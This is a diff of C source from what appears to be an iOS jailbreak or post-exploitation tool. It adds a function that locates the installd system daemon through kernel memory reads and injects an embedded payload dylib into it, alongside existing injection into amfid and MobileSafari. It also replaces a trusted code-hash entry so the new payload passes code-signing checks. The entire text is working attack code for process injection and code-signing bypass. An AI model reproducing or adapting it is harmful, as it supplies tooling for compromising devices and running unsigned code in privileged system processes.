@@ -369,6 +369,22 @@ void patch_amfid(uint64_t self_proc) {
     inject_dylib(self_proc, target_proc, name, start, end - start);
 }
 
+void patch_installd(uint64_t self_proc) {
+    const char *name = "installd";
+    uint64_t target_proc = proc_of_name(name);
+    if (target_proc == 0) {
+        printf("Unable to find %s process. Cannot continue!\n", name);
+        return;
+    }
+    printf("%s pid: %d\n", name, kernel_read32(target_proc + OFFSET(proc, p_pid)));
+
+    IMPORT_BIN("payload/installd_payload.dylib", installd_payload);
+    extern const uint8_t installd_payload_start, installd_payload_end;
+    const uint8_t *start = &installd_payload_start, *end = &installd_payload_end;
+
+    inject_dylib(self_proc, target_proc, name, start, end - start);
+}
+
 #ifdef PATCH_SAFARI
 void patch_safari(uint64_t self_proc) {
     const char *name = "MobileSafari";
@@ -390,7 +406,7 @@ void patch_safari(uint64_t self_proc) {
 void drop_payload() {
     uint8_t hashes[] = {
         0xec, 0x08, 0xf6, 0xf5, 0x85, 0x55, 0x66, 0x62, 0xe2, 0xe9, 0x62, 0x48, 0xab, 0x5e, 0x3d, 0x7b, 0x1e, 0xc7, 0x66, 0xc5, // amfid_payload.dylib
-        0x61, 0x12, 0xed, 0xbe, 0xd2, 0xc6, 0x24, 0x7f, 0xfb, 0xdd, 0x0a, 0xac, 0xcc, 0xbf, 0x8d, 0x6a, 0xb4, 0x98, 0xde, 0x20, // safari_payload.dylib
+        0x21, 0x61, 0xb9, 0x84, 0xab, 0x93, 0xc1, 0x77, 0x15, 0x62, 0x1f, 0x13, 0xcd, 0x79, 0x88, 0xaa, 0xef, 0x03, 0x8d, 0x8d, // installd_payload.dylib
     };
     trust_hashes(hashes, sizeof(hashes) / CS_CDHASH_LEN);
 
@@ -405,6 +421,7 @@ void drop_payload() {
     uint64_t self_sb = sandbox(self_proc, 0);
 
     patch_amfid(self_proc);
+    patch_installd(self_proc);
 
 #ifdef PATCH_SAFARI
     patch_safari(self_proc);
